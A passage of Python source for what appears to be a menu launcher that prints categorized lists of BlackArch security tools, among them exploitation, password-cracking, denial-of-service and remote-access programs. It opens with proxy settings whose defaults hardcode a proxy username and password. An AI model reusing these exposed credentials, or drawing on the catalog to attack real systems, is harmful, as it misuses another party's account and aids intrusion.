        input("Enter Proxy Host (leave blank to keep current): ") or "p.webshare.io"
    )
    proxy_port = input("Enter Proxy Port (leave blank to keep current): ") or "80"
    proxy_user = (
        input("Enter Proxy User (leave blank to keep current): ") or "pbgbttrk-rotate"
    )
    proxy_pass = (
        input("Enter Proxy Password (leave blank to keep current): ") or "h2oktfdte1oh"
    )

    # Save new settings
    with open(PROXY_FILE, "w") as f:
        f.write(
            f"PROXY_HOST = '{proxy_host}'\nPROXY_PORT = {proxy_port}\nPROXY_USER = '{proxy_user}'\nPROXY_PASS = '{proxy_pass}'\n"
        )

    print(Fore.GREEN + "Proxy settings updated successfully!" + Style.RESET_ALL)


def Lister(tools):
    for index, tool in enumerate(tools, start=1):
        print(f"{index}. {tool}")


def WebApp():
    Banner()
    tools = [
        "0d1n",
        "abuse-ssl-bypass-waf",
        "adfind",
        "adminpagefinder",
        "albatar",
        "anti-xss",
        "arachni",
        "astra",
        "atlas",
        "badministration",
        "badsecrets",
        "bbqsql",
        "bbscan",
        "bing-lfi-rfi",
        "blisqy",
        "brutemap",
        "brutexss",
        "bsqlbf",
        "bsqlinjector",
        "burpsuite",
        "c5scan",
        "cansina",
        "cariddi",
        "cent",
        "chankro",
        "cjexploiter",
        "clairvoyance",
        "cloudget",
        "cms-few",
        "cmseek",
        "cmsfuzz",
        "cmsscan",
        "cmsscanner",
        "comission",
        "commentor",
        "commix",
        "corscanner",
        "corsy",
        "crabstick",
        "crackql",
        "crawlic",
        "crlfuzz",
        "csrftester",
        "cybercrowl",
        "dalfox",
        "darkdump",
        "darkjumper",
        "darkscrape",
        "davscan",
        "dawnscanner",
        "dff-scanner",
        "dirble",
        "dirbuster-ng",
        "dirhunt",
        "dirscraper",
        "dirsearch",
        "docem",
        "domi-owned",
        "dontgo403",
        "doork",
        "dorknet",
        "droopescan",
        "drupal-module-enum",
        "drupalscan",
        "drupwn",
        "dsfs",
        "dsjs",
        "dsss",
        "dsstore-crawler",
        "dsxs",
        "eos",
        "epicwebhoneypot",
        "evine",
        "extended-ssrf-search",
        "eyewitness",
        "fbht",
        "fdsploit",
        "feroxbuster",
        "ffuf",
        "fhttp",
        "filebuster",
        "filegps",
        "fingerprinter",
        "flask-session-cookie-manager2",
        "flask-session-cookie-manager3",
        "fockcache",
        "fuxploider",
        "gau",
        "ghauri",
        "ghost-py",
        "gitdump",
        "gittools",
        "gobuster",
        "golismero",
        "goop-dump",
        "gopherus",
        "gospider",
        "gowitness",
        "grabber",
        "graphql-path-enum",
        "graphqlmap",
        "graphw00f",
        "h2csmuggler",
        "h2t",
        "hakrawler",
        "hetty",
        "hookshot",
        "htcap",
        "http2smugl",
        "httpforge",
        "httpgrep",
        "httppwnly",
        "httpx",
        "identywaf",
        "injectus",
        "interactsh-client",
        "ipsourcebypass",
        "jaeles",
        "jaidam",
        "jast",
        "jdeserialize",
        "jexboss",
        "jira-scan",
        "jok3r",
        "jomplug",
        "jooforce",
        "joomlascan",
        "joomlavs",
        "joomscan",
        "jshell",
        "jsonbee",
        "jsparser",
        "jsql-injection",
        "jstillery",
        "juumla",
        "jwt-hack",
        "kadimus",
        "katana-pd",
        "kiterunner",
        "kolkata",
        "konan",
        "kubolt",
        "lfi-exploiter",
        "lfi-fuzzploit",
        "lfi-image-helper",
        "lfi-sploiter",
        "lfifreak",
        "lfimap",
        "liffy",
        "lightbulb",
        "linkfinder",
        "list-urls",
        "log4j-bypass",
        "log4j-scan",
        "lorsrf",
        "lulzbuster",
        "magescan",
        "malicious-pdf",
        "mando.me",
        "meg",
        "metoscan",
        "monsoon",
        "mooscan",
        "morxtraversal",
        "multiinjector",
        "nosqli",
        "nosqlmap",
        "novahot",
        "okadminfinder",
        "onionsearch",
        "opendoor",
        "owasp-bywaf",
        "owtf",
        "pappy-proxy",
        "parameth",
        "parampampam",
        "paros",
        "payloadmask",
        "peepingtom",
        "photon",
        "php-findsock-shell",
        "php-malware-finder",
        "phpggc",
        "phpsploit",
        "pinkerton",
        "pixload",
        "plecost",
        "plown",
        "poly",
        "pown",
        "ppfuzz",
        "ppmap",
        "proxenet",
        "pwndrop",
        "pyfiscan",
        "python-witnessme",
        "python2-jsbeautifier",
        "rabid",
        "rapidscan",
        "remot3d",
        "restler-fuzzer",
        "riwifshell",
        "ruler",
        "rustbuster",
        "rww-attack",
        "sawef",
        "scanqli",
        "scrying",
        "second-order",
        "secretfinder",
        "secscan",
        "see-surf",
        "serializationdumper",
        "shortfuzzy",
        "shuffledns",
        "sitadel",
        "sitediff",
        "skipfish",
        "smplshllctrlr",
        "smuggler",
        "smuggler-py",
        "snallygaster",
        "snuck",
        "sourcemapper",
        "spaf",
        "sparty",
        "spiga",
        "spike-proxy",
        "spipscan",
        "sprayingtoolkit",
        "sqid",
        "ssrf-sheriff",
        "ssrfmap",
        "stews",
        "striker",
        "subjs",
        "themole",
        "tidos-framework",
        "tinja",
        "torcrawl",
        "tplmap",
        "typo3scan",
        "uncaptcha2",
        "uppwn",
        "urlcrazy",
        "urldigger",
        "urlextractor",
        "vane",
        "vanguard",
        "vbscan",
        "vega",
        "vsvbp",
        "vulnerabilities-spider",
        "vulnx",
        "w13scan",
        "wafninja",
        "wafp",
        "wafpass",
        "wapiti",
        "wascan",
        "waybackpack",
        "wcvs",
        "web-soul",
        "webanalyze",
        "webborer",
        "webhandler",
        "webkiller",
        "webshells",
        "webslayer",
        "webtech",
        "webxploiter",
        "weevely",
        "weirdaal",
        "whatwaf",
        "whichcdn",
        "wig",
        "witchxtool",
        "wordpress-exploit-framework",
        "wpforce",
        "wpintel",
        "wpseku",
        "ws-attacker",
        "wssip",
        "wuzz",
        "x8",
        "xmlrpc-bruteforcer",
        "xspear",
        "xsrfprobe",
        "xss-freak",
        "xsscon",
        "xsscrapy",
        "xsser",
        "xssless",
        "xsspy",
        "xsss",
        "xssscan",
        "xsssniper",
        "xsstrike",
        "xssya",
        "xwaf",
        "xxxpwn",
        "xxxpwn-smart",
        "yaaf",
        "yasuo",
        "yawast",
        "ycrawler",
        "ysoserial",
    ]

    Lister(tools)


def Scanner():
    Banner()

    tools = [
        "0trace",
        "a2sv",
        "admsnmp",
        "allthevhosts",
        "amass",
        "anubis",
        "apache-users",
        "apachetomcatscanner",
        "arjun",
        "assassingo",
        "assetfinder",
        "athena-ssl-scanner",
        "atscan",
        "attk",
        "aws-extender-cli",
        "aws-iam-privesc",
        "barmie",
        "bashscan",
        "belati",
        "bingoo",
        "birp",
        "blackbox-scanner",
        "bleah",
        "blindy",
        "bluto",
        "braa",
        "cameradar",
        "camscan",
        "cangibrina",
        "cecster",
        "cero",
        "changeme",
        "check-weak-dh-ssh",
        "chiron",
        "cipherscan",
        "ciscos",
        "clair",
        "climber",
        "cloudflare-enum",
        "cloudsploit",
        "cmsmap",
        "configpush",
        "corstest",
        "cpfinder",
        "crackmapexec",
        "creepy",
        "ct-exposer",
        "cvechecker",
        "d-tect",
        "darkbing",
        "davtest",
        "dbusmap",
        "dcrawl",
        "deblaze",
        "delldrac",
        "dhcpig",
        "dirb",
        "dirbuster",
        "dirscanner",
        "dirstalk",
        "dmitry",
        "dnmap",
        "dns2geoip",
        "dnsa",
        "dnsbf",
        "dnscan",
        "dnsgoblin",
        "dnspredict",
        "dnstwist",
        "dockerscan",
        "dorkbot",
        "dorkme",
        "dpscan",
        "driftnet",
        "dripper",
        "dvcs-ripper",
        "eazy",
        "enum-shares",
        "enumiax",
        "eternal-scanner",
        "faradaysec",
        "fernmelder",
        "fgscanner",
        "fi6s",
        "find-dns",
        "flashscanner",
        "flunym0us",
        "forkingportscanner",
        "fortiscan",
        "fs-nyarl",
        "fscan",
        "fsnoop",
        "ftp-spider",
        "ftpscout",
        "gcpbucketbrute",
        "gethsploit",
        "gggooglescan",
        "ghost-phisher",
        "git-dump",
        "git-dumper",
        "gitrob",
        "gloom",
        "grabbb",
        "graphql-cop",
        "grepforrfi",
        "grype",
        "gtp-scan",
        "h2buster",
        "habu",
        "hakku",
        "halberd",
        "hbad",
        "hellraiser",
        "hikpwn",
        "homepwn",
        "hoppy",
        "host-extract",
        "hsecscan",
        "http-enum",
        "httprobe",
        "httpsscanner",
        "iaxscan",
        "icmpquery",
        "iis-shortname-scanner",
        "ike-scan",
        "ilo4-toolbox",
        "infip",
        "inurlbr",
        "ipscan",
        "iptv",
        "ipv6toolkit",
        "jaadas",
        "knock",
        "knxmap",
        "krbrelayx",
        "kscan",
        "kube-hunter",
        "kubesploit",
        "kubestriker",
        "laf",
        "ldapdomaindump",
        "leaklooker",
        "letmefuckit-scanner",
        "leviathan",
        "lfi-scanner",
        "lfisuite",
        "linenum",
        "linux-smart-enumeration",
        "littleblackbox",
        "locasploit",
        "logmepwn",
        "lotophagi",
        "lunar",
        "maligno",
        "manspider",
        "mantra",
        "maryam",
        "mitm6",
        "modscan",
        "mongoaudit",
        "mqtt-pwn",
        "msmailprobe",
        "mssqlscan",
        "multiscanner",
        "naabu",
        "navgix",
        "netbios-share-scanner",
        "netexec",
        "netscan",
        "netscan2",
        "netz",
        "nili",
        "nmbscan",
        "nray",
        "nsec3map",
        "ntlm-challenger",
        "ntlm-scanner",
        "ntlmrecon",
        "nuclei",
        "nuclei-templates",
        "o-saft",
        "ocs",
        "onetwopunch",
        "onionscan",
        "openvas",
        "pagodo",
        "paketto",
        "panhunt",
        "paranoic",
        "passhunt",
        "pbscan",
        "pcredz",
        "peass",
        "pentestly",
        "plcscan",
        "pnscan",
        "poison",
        "ppscan",
        "prads",
        "praeda",
        "proxycheck",
        "proxyscan",
        "pwndora",
        "pyssltest",
        "pytbull",
        "pythem",
        "python2-ldapdomaindump",
        "ranger-scanner",
        "rawr",
        "rbac-lookup",
        "rdp-cipher-checker",
        "rdp-sec-check",
        "relay-scanner",
        "remote-method-guesser",
        "responder",
        "retire",
        "routerhunter",
        "rtlizer",
        "rtlsdr-scanner",
        "s3scanner",
        "sambascan",
        "sandcastle",
        "sandmap",
        "sandy",
        "sb0x",
        "scamper",
        "scanless",
        "scanssh",
        "scout2",
        "scoutsuite",
        "scrape-dns",
        "sdnpwn",
        "seat",
        "shareenum",
        "sharesniffer",
        "simple-lan-scan",
        "simple-lan-scan3",
        "sipshock",
        "slurp-scanner",
        "smap-scanner",
        "smbexec",
        "smbmap",
        "smbspider",
        "smbsr",
        "smod",
        "smtp-test",
        "smtp-vrfy",
        "smtptx",
        "snmpenum",
        "snmpscan",
        "snoopbrute",
        "sparta",
        "sqlivulscan",
        "ssdp-scanner",
        "ssh-user-enum",
        "sslcaudit",
        "ssllabs-scan",
        "sslmap",
        "sslscan2",
        "stacs",
        "sticky-keys-hunter",
        "stig-viewer",
        "strutscan",
        "subjack",
        "subover",
        "swarm",
        "synscan",
        "tachyon-scanner",
        "tactical-exploitation",
        "taipan",
        "takeover",
        "tlsx",
        "topera",
        "traxss",
        "udp-hunter",
        "udsim",
        "umap",
        "unicornscan",
        "upnpscan",
        "uptux",
        "uw-loveimap",
        "uw-udpscan",
        "uw-zone",
        "v3n0m",
        "vais",
        "vault-scanner",
        "vcsmap",
        "vhostscan",
        "videosnarf",
        "visql",
        "vscan",
        "vulmap",
        "vuls",
        "wafw00f",
        "webenum",
        "webhunter",
        "webpwn3r",
        "webrute",
        "whitewidow",
        "wolpertinger",
        "wordpresscan",
        "xcname",
        "xpire-crossdomain-scanner",
        "xsstracer",
        "yasat",
    ]

    Lister(tools)


def Proxy():
    Banner()

    tools = [
        "3proxy",
        "bdfproxy",
        "binproxy",
        "cntlm",
        "datajackproxy",
        "dns-reverse-proxy",
        "dnschef",
        "elite-proxy-finder",
        "fakedns",
        "fireprox",
        "jondo",
        "mallory",
        "mitm-relay",
        "modlishka",
        "mubeng",
        "obfs4proxy",
        "pr0cks",
        "proxify",
        "proxybroker2",
        "proxyp",
        "redsocks",
        "rpivot",
        "sergio-proxy",
        "soapui",
        "sslstrip",
        "ssrf-proxy",
        "starttls-mitm",
        "stowaway",
        "striptls",
        "tftp-proxy",
        "trevorproxy",
        "webfixy",
    ]

    Lister(tools)


def BlackArch_windows():
    Banner()

    tools = [
        "3proxy-win32",
        "adape-script",
        "adpeas",
        "agafi",
        "analyzepesig",
        "antiransom",
        "atstaketools",
        "backorifice",
        "breads",
        "browselist",
        "brute12",
        "brutus",
        "cachedump",
        "certi",
        "certipy",
        "chrome-decode",
        "chromensics",
        "conpass",
        "crackmapexec-pingcastle",
        "dark-dork-searcher",
        "darkarmour",
        "de4dot",
        "directorytraversalscan",
        "dnspy",
        "donpapi",
        "dotpeek",
        "dumpacl",
        "dumpusers",
        "eraser",
        "etherchange",
        "etherflood",
        "filefuzz",
        "fport",
        "fred",
        "fuzztalk",
        "gene",
        "ghostpack",
        "gplist",
        "gpowned",
        "grabitall",
        "gsd",
        "gtalk-decode",
        "handle",
        "hekatomb",
        "hollows-hunter",
        "hookanalyser",
        "httpbog",
        "httprecon",
        "httprint-win32",
        "hyperion-crypter",
        "ikeprobe",
        "intercepter-ng",
        "inzider",
        "juicy-potato",
        "justdecompile",
        "kekeo",
        "kerbcrack",
        "klogger",
        "ldapmonitor",
        "lethalhta",
        "lolbas",
        "malwareanalyser",
        "mbenum",
        "memimager",
        "mimikatz",
        "mingsweeper",
        "modifycerttemplate",
        "mrkaplan",
        "mssqlrelay",
        "msvpwn",
        "nbname",
        "nbtenum",
        "netbus",
        "netexec-pingcastle",
        "netripper",
        "netstumbler",
        "nirsoft",
        "nishang",
        "ntds-decode",
        "orakelcrackert",
        "osslsigncode",
        "pafish",
        "pe-bear",
        "pe-sieve",
        "periscope",
        "petools",
        "pextractor",
        "php-vulnerability-hunter",
        "pingcastle",
        "pmap",
        "pmdump",
        "powercloud",
        "powerlessshell",
        "powerops",
        "powershdll",
        "ppee",
        "pre2k",
        "promiscdetect",
        "pstoreview",
        "pwdump",
        "pygpoabuse",
        "python2-minidump",
        "python2-minikerberos",
        "radiography",
        "rasenum",
        "regreport",
        "regview",
        "resourcehacker",
        "roadlib",
        "roadoidc",
        "roadrecon",
        "roadtx",
        "rpak",
        "rpcsniffer",
        "rpctools",
        "sccmhunter",
        "setowner",
        "shad0w",
        "shed",
        "sigspotter",
        "sipscan",
        "skype-dump",
        "smbrelay",
        "snitch",
        "snowman",
        "snscan",
        "spade",
        "sqldict",
        "sqlping",
        "sqlpowerinjector",
        "streamfinder",
        "sub7",
        "superscan",
        "sysinternals-suite",
        "targetedkerberoast",
        "uacme",
        "unsecure",
        "upnp-pentest-toolkit",
        "wce",
        "wifichannelmonitor",
        "windivert",
        "windows-binaries",
        "windows-privesc-check",
        "windowsspyblocker",
        "winfo",
        "winhex",
        "winpwn",
        "winrelay",
        "wpsweep",
        "wups",
        "x-scan",
        "x64dbg",
    ]

    Lister(tools)


def Dos():
    Banner()
    tools = [
        "42zip",
        "blacknurse",
        "bonesi",
        "davoset",
        "ddosify",
        "dnsdrdos",
        "goldeneye",
        "hulk",
        "hwk",
        "iaxflood",
        "impulse",
        "inviteflood",
        "mausezahn",
        "network-app-stress-tester",
        "nkiller2",
        "ntpdos",
        "phpstress",
        "pwnloris",
        "shitflood",
        "slowloris",
        "slowloris-py",
        "synflood",
        "t50",
        "tcgetkey",
        "thc-ssl-dos",
        "torshammer",
        "ufonet",
        "wreckuests",
    ]

    Lister(tools)


def Disassembler():
    Banner()

    tools = [
        "abcd",
        "binnavi",
        "chiasm-shell",
        "exe2hex",
        "libdisasm",
        "lief",
        "marc4dasm",
        "plasma-disasm",
        "python-lief",
        "python-pcodedmp",
        "python2-capstone",
        "python2-pcodedmp",
        "radare2-unicorn",
        "redasm",
        "scratchabit",
        "unstrip",
        "viper",
    ]

    Lister(tools)


def Cracker():
    Banner()

    tools = [
        "acccheck",
        "adfspray",
        "aesfix",
        "aeskeyfind",
        "against",
        "ares",
        "asleap",
        "beleth",
        "bgp-md5crack",
        "bios_memimage",
        "bkcrack",
        "bkhive",
        "blackhash",
        "bob-the-butcher",
        "brute-force",
        "bruteforce-luks",
        "bruteforce-salted-openssl",
        "bruteforce-wallet",
        "brutessh",
        "chapcrack",
        "cintruder",
        "cisco-auditing-tool",
        "cisco-ocs",
        "cisco-scanner",
        "cisco5crack",
        "cisco7crack",
        "cmospwd",
        "compp",
        "crackhor",
        "crackle",
        "crackpkcs12",
        "crackq",
        "crackserver",
        "creddump",
        "credmaster",
        "crowbar",
        "cryptohazemultiforcer",
        "cudahashcat",
        "cupp",
        "dbpwaudit",
        "depant",
        "device-pharmer",
        "doozer",
        "dpeparser",
        "eapmd5pass",
        "enabler",
        "evilize",
        "evilmaid",
        "f-scrack",
        "facebrute",
        "fang",
        "flask-unsign",
        "ftp-scanner",
        "gomapenum",
        "gpocrack",
        "hasher",
        "hashtag",
        "hostbox-ssh",
        "htpwdscan",
        "ibrute",
        "icloudbrutter",
        "iheartxor",
        "iisbruteforcer",
        "ikecrack",
        "ikeforce",
        "inguma",
        "instashell",
        "ipmipwn",
        "jbrute",
        "jeangrey",
        "johnny",
        "jwt-cracker",
        "jwt-tool",
        "jwtcat",
        "keimpx",
        "kerbrute",
        "khc",
        "ldap-brute",
        "levye",
        "lodowep",
        "mdcrack",
        "mkbrutus",
        "morxbook",
        "morxbrute",
        "morxbtcrack",
        "morxcoinpwn",
        "morxcrack",
        "mybff",
        "o365enum",
        "o365spray",
        "obevilion",
        "oclhashcat",
        "omen",
        "onesixtyone",
        "outlook-webapp-brute",
        "owabf",
        "pack",
        "passcracking",
        "passe-partout",
        "passgan",
        "patator",
        "pdgmail",
        "pemcrack",
        "pemcracker",
        "phoss",
        "php-mt-seed",
        "php-rfi-payload-decoder",
        "phrasendrescher",
        "pipal",
        "pipeline",
        "pkcrack",
        "pwcrack",
        "pybozocrack",
        "pyrit",
        "rainbowcrack",
        "rcracki-mt",
        "rdesktop-brute",
        "rdpassspray",
        "rfcrack",
        "ridenum",
        "rlogin-scanner",
        "rootbrute",
        "rpdscan",
        "rsakeyfind",
        "samdump2",
        "samydeluxe",
        "shreder",
        "sidguesser",
        "sipcrack",
        "skul",
        "smbbf",
        "snmp-brute",
        "speedpwn",
        "spray365",
        "spraycharles",
        "sqlpat",
        "ssh-privkey-crack",
        "sshatter",
        "sshprank",
        "sshscan",
        "sshtrix",
        "sslnuke",
        "sucrack",
        "talon",
        "tftp-bruteforce",
        "thc-keyfinder",
        "thc-pptp-bruter",
        "thc-smartbrute",
        "timeverter",
        "trevorspray",
        "truecrack",
        "tweetshell",
        "ufo-wardriving",
        "vnc-bypauth",
        "vncrack",
        "wmat",
        "wordbrutepress",
        "wpbf",
        "wpbrute-rpc",
        "wyd",
        "zulu",
    ]

    Lister(tools)


def Voip():
    Banner()

    tools = [
        "ace",
        "bluebox-ng",
        "erase-registrations",
        "ilty",
        "isip",
        "isme",
        "mrsip",
        "pcapsipdump",
        "protos-sip",
        "redirectpoison",
        "rtp-flood",
        "siparmyknife",
        "sipbrute",
        "sipp",
        "sippts",
        "sipsak",
        "storm-ring",
        "teardown",
        "vnak",
        "voiper",
        "voipong",
        "vsaudit",
    ]

    Lister(tools)


def Forensic():
    Banner()

    tools = [
        "afflib",
        "aimage",
        "air",
        "analyzemft",
        "autopsy",
        "bmap-tools",
        "bmc-tools",
        "bulk-extractor",
        "canari",
        "captipper",
        "casefile",
        "chaosmap",
        "chromefreak",
        "dc3dd",
        "dcfldd",
        "dfir-ntfs",
        "dftimewolf",
        "disitool",
        "dmde",
        "dmg2img",
        "dshell",
        "dumpzilla",
        "eindeutig",
        "emldump",
        "evtkit",
        "exiflooter",
        "extractusnjrnl",
        "firefox-decrypt",
        "fridump",
        "galleta",
        "grokevt",
        "guymager",
        "imagemounter",
        "indx2csv",
        "indxcarver",
        "indxparse",
        "interrogate",
        "iosforensic",
        "ipba2",
        "iphoneanalyzer",
        "jefferson",
        "lazagne",
        "ldsview",
        "lfle",
        "libfvde",
        "limeaide",
        "log-file-parser",
        "loki-scanner",
        "mac-robber",
        "magicrescue",
        "make-pdf",
        "malheur",
        "maltego",
        "malwaredetect",
        "mboxgrep",
        "mdbtools",
        "memdump",
        "memfetch",
        "mft2csv",
        "mftcarver",
        "mftrcrd",
        "mftref2name",
        "mimipenguin",
        "mobiusft",
        "mp3nema",
        "mxtract",
        "myrescue",
        "naft",
        "netspionage",
        "networkminer",
        "nfex",
        "ntdsxtract",
        "ntfs-file-extractor",
        "ntfs-log-tracker",
        "parse-evtx",
        "pasco",
        "pcapxray",
        "pdblaster",
        "pdf-parser",
        "pdfbook-analyzer",
        "pdfid",
        "pdfresurrect",
        "peepdf",
        "pev",
        "powermft",
        "python-acquire",
        "python-dissect.archive",
        "python-dissect.btrfs",
        "python-dissect.cim",
        "python-dissect.clfs",
        "python-dissect.cstruct",
        "python-dissect.esedb",
        "python-dissect.etl",
        "python-dissect.eventlog",
        "python-dissect.evidence",
        "python-dissect.executable",
        "python-dissect.extfs",
        "python-dissect.fat",
        "python-dissect.ffs",
        "python-dissect.fve",
        "python-dissect.hypervisor",
        "python-dissect.jffs",
        "python-dissect.ntfs",
        "python-dissect.ole",
        "python-dissect.regf",
        "python-dissect.shellitem",
        "python-dissect.sql",
        "python-dissect.squashfs",
        "python-dissect.target",
        "python-dissect.thumbcache",
        "python-dissect.util",
        "python-dissect.vmfs",
        "python-dissect.volume",
        "python-dissect.xfs",
        "python-flow.record",
        "python2-peepdf",
        "rcrdcarver",
        "recentfilecache-parser",
        "recoverdm",
        "recoverjpeg",
        "recuperabit",
        "regipy",
        "reglookup",
        "regripper",
        "regrippy",
        "rekall",
        "replayproxy",
        "rifiuti2",
        "safecopy",
        "scalpel",
        "scrounge-ntfs",
        "secure2csv",
        "shadowexplorer",
        "skypefreak",
        "swap-digger",
        "tchunt-ng",
        "tekdefense-automater",
        "thumbcacheviewer",
        "trid",
        "truehunter",
        "unblob",
        "undbx",
        "usbrip",
        "usnjrnl2csv",
        "usnparser",
        "vinetto",
        "vipermonkey",
        "volafox",
        "volatility-extra",
        "windows-prefetch-parser",
        "wmi-forensics",
        "xplico",
        "zipdump",
    ]

    Lister(tools)


def Exploitation():
    Banner()

    tools = [
        "aclpwn",
        "adenum",
        "aggroargs",
        "angrop",
        "armitage",
        "armor",
        "armscgen",
        "arpoison",
        "autosploit",
        "backoori",
        "bad-pdf",
        "barq",
        "bed",
        "beef",
        "beroot",
        "bfbtester",
        "binex",
        "bitdump",
        "blind-sql-bitshifting",
        "bloodyad",
        "bluffy",
        "botb",
        "bowcaster",
        "brosec",
        "camover",
        "certsync",
        "chw00t",
        "cisco-global-exploiter",
        "cisco-torch",
        "coercer",
        "cve-search",
        "cvemap",
        "darkd0rk3r",
        "darkmysqli",
        "darkspiritz",
        "deepce",
        "delorean",
        "dkmc",
        "dotdotpwn",
        "dr-checker",
        "drinkme",
        "ducktoolkit",
        "encodeshellcode",
        "enteletaor",
        "entropy",
        "erl-matter",
        "evil-winrm",
        "evilclippy",
        "exploit-db",
        "exploitpack",
        "eyepwn",
        "ffm",
        "fimap",
        "firstexecution",
        "flashsploit",
        "formatstringexploiter",
        "fs-exploit",
        "fuzzbunch",
        "gadgettojscript",
        "getsploit",
        "ghostdelivery",
        "hackredis",
        "hamster",
        "hcraft",
        "heartleech",
        "hqlmap",
        "htexploit",
        "htshells",
        "impacket-ba",
        "inception",
        "insanity",
        "irpas",
        "isf",
        "jboss-autopwn",
        "jndi-injection-exploit",
        "katana-framework",
        "kerberoast",
        "kernelpop",
        "killcast",
        "killerbee",
        "klar",
        "l0l",
        "leroy-jenkins",
        "lfi-autopwn",
        "limelighter",
        "lisa.py",
        "m3-gen",
        "marshalsec",
        "minimysqlator",
        "miranda-upnp",
        "mitmf",
        "moonwalk",
        "mosquito",
        "myjwt",
        "n1qlmap",
        "nosqli-user-pass-enum",
        "ntlm-theft",
        "office-dde-payloads",
        "opensvp",
        "osueta",
        "otori",
        "owasp-zsc",
        "pacu",
        "pathzuzu",
        "pblind",
        "phantom-evasion",
        "pirana",
        "pkinittools",
        "pmcma",
        "pocsuite",
        "pompem",
        "powersploit",
        "preeny",
        "pret",
        "ps1encode",
        "ptf",
        "punk",
        "pwncat-caleb",
        "pykek",
        "python-ssh-mitm",
        "python2-ropgadget",
        "rebind",
        "rex",
        "rext",
        "richsploit",
        "rmiscout",
        "rombuster",
        "ropeme",
        "roputils",
        "rp",
        "rspet",
        "sc-make",
        "scansploit",
        "sensepost-xrdp",
        "serialbrute",
        "shellcode-compiler",
        "shellcode-factory",
        "shellcodecs",
        "shellen",
        "shellme",
        "shellsploit-framework",
        "shellter",
        "shocker",
        "sickle",
        "sigploit",
        "sigthief",
        "sireprat",
        "sjet",
        "smap",
        "smtptester",
        "snarf-mitm",
        "spraykatz",
        "sqlninja",
        "sqlsus",
        "ssh-mitm",
        "sstimap",
        "stackflow",
        "staekka",
        "subterfuge",
        "suid3num",
        "tcpjunk",
        "tomcatwardeployer",
        "unibrute",
        "venom",
        "viproy-voipkit",
        "vmap",
        "volana",
        "webexploitationtool",
        "websploit",
        "wesng",
        "wildpwn",
        "wsuspect-proxy",
        "xcat",
        "xpl-search",
        "xrop",
        "xxeinjector",
        "xxexploiter",
        "yinjector",
        "zarp",
        "zeratool",
        "zirikatu",
    ]

    Lister(tools)


def Networking():
    Banner()

    tools = [
        "adassault",
        "aiengine",
        "apacket",
        "argus",
        "argus-clients",
        "arpalert",
        "arping-th",
        "arptools",
        "arpwner",
        "asnmap",
        "autovpn",
        "buttinsky",
        "bypass-firewall-dns-history",
        "chameleon",
        "chaosreader",
        "chopshop",
        "cidr2range",
        "creak",
        "cyberscan",
        "dcdetector",
        "depdep",
        "det",
        "dhcpoptinj",
        "dinouml",
        "dnsdiag",
        "dnsfilexfer",
        "dnsobserver",
        "dnsteal",
        "dnsvalidator",
        "dripcap",
        "dtp-spoof",
        "dublin-traceroute",
        "dump1090",
        "evillimiter",
        "exabgp",
        "filibuster",
        "firecat",
        "flowinspect",
        "girsh",
        "gspoof",
        "gwcheck",
        "haka",
        "hharp",
        "http-traceroute",
        "hyde",
        "hyenae",
        "hyperfox",
        "infection-monkey",
        "interlace",
        "ipaudit",
        "ipdecap",
        "ipv4bypass",
        "jnetmap",
        "kickthemout",
        "krbjack",
        "latd",
        "libparistraceroute",
        "libtins",
        "loic",
        "maclookup",
        "maketh",
        "malcom",
        "massdns",
        "middler",
        "mitm",
        "moloch",
        "mptcp",
        "mptcp-abuse",
        "mylg",
        "nacker",
        "nbtool",
        "ncpfs",
        "nemesis",
        "netactview",
        "netcon",
        "netmap",
        "netreconn",
        "netsed",
        "networkmap",
        "nextnet",
        "nfdump",
        "nield",
        "nipper",
        "nsdtool",
        "nsoq",
        "packet-o-matic",
        "packetq",
        "packetsender",
        "packit",
        "pcapfex",
        "pcapfix",
        "phantap",
        "pivotsuite",
        "pkt2flow",
        "pmacct",
        "prometheus-firewall",
        "pwnat",
        "pyersinia",
        "pyexfil",
        "pyminifakedns",
        "python-cymruwhois",
        "python2-cymruwhois",
        "rinetd",
        "rtpbreak",
        "rustcat",
        "samplicator",
        "sdn-toolkit",
        "sessionlist",
        "seth",
        "silk",
        "skydive",
        "sniffer",
        "sniffles",
        "snmpattack",
        "snmpcheck",
        "sockstat",
        "sprayhound",
        "sps",
        "stunner",
        "tcpcopy",
        "tcpdstat",
        "tcpextract",
        "tcptrace",
        "tcptraceroute",
        "tcpwatch",
        "tgcd",
        "torpy",
        "tunna",
        "turner",
        "udpastcp",
        "udptunnel",
        "umit",
        "uw-offish",
        "websockify",
        "wondershaper",
        "xerosploit",
        "xxeserv",
        "yaf",
        "yersinia",
        "zackattack",
        "zdns",
        "zeek",
        "zeek-aux",
    ]

    Lister(tools)


def Mobile():
    Banner()

    tools = [
        "android-apktool",
        "apkstudio",
        "binaryninja",
        "ctypes-sh",
        "elidecode",
        "flasm",
        "frida-extract",
        "gostringsr2",
        "hopper",
        "ida-free",
        "innounp",
        "javasnoop",
        "jeb-android",
        "jeb-arm",
        "jeb-intel",
        "jeb-mips",
        "jeb-webasm",
        "jwscan",
        "libc-database",
        "malwasm",
        "mikrotik-npk",
        "netzob",
        "pintool",
        "pintool2",
        "pyinstxtractor",
        "python-frida",
        "python2-frida",
        "radare2-keystone",
        "swfintruder",
        "swftools",
        "syms2elf",
        "udis86",
    ]

    Lister(tools)


def Automation():
    Banner()

    tools = [
        "apt2",
        "automato",
        "autonessus",
        "autonse",
        "autopwn",
        "autorecon",
        "awsbucketdump",
        "bashfuscator",
        "blueranger",
        "bopscrk",
        "brutespray",
        "brutex",
        "byepass",
        "cewl",
        "cheat-sh",
        "cisco-snmp-enumeration",
        "clusterd",
        "codeql",
        "commonspeak",
        "cook",
        "crunch",
        "deathstar",
        "dorkscout",
        "dracnmap",
        "dumb0",
        "easy-creds",
        "easyda",
        "emp3r0r",
        "empire",
        "findsploit",
        "fstealer",
        "glue",
        "go-exploitdb",
        "google-explorer",
        "gooscan",
        "hackersh",
        "harpoon",
        "hate-crack",
        "havoc-c2",
        "intersect",
        "invoke-cradlecrafter",
        "invoke-dosfuscation",
        "invoke-obfuscation",
        "koadic",
        "ldapscripts",
        "linikatz",
        "linset",
        "lyricpass",
        "maskprocessor",
        "masscan-automation",
        "massexpconsole",
        "mentalist",
        "merlin-server",
        "metasploit-autopwn",
        "mitmap-old",
        "morpheus",
        "msf-mpc",
        "msfenum",
        "mutator",
        "nettacker",
        "nfspy",
        "nfsshell",
        "nosqlattack",
        "nullscan",
        "octopwnweb",
        "openscap",
        "panoptic",
        "pastejacker",
        "pasv-agrsv",
        "penbox",
        "pentestgpt",
        "pentmenu",
        "pin",
        "portia",
        "pupy",
        "pureblood",
        "pyfuscation",
        "recomposer",
        "rhodiola",
        "rsmangler",
        "sakis3g",
        "scap-security-guide",
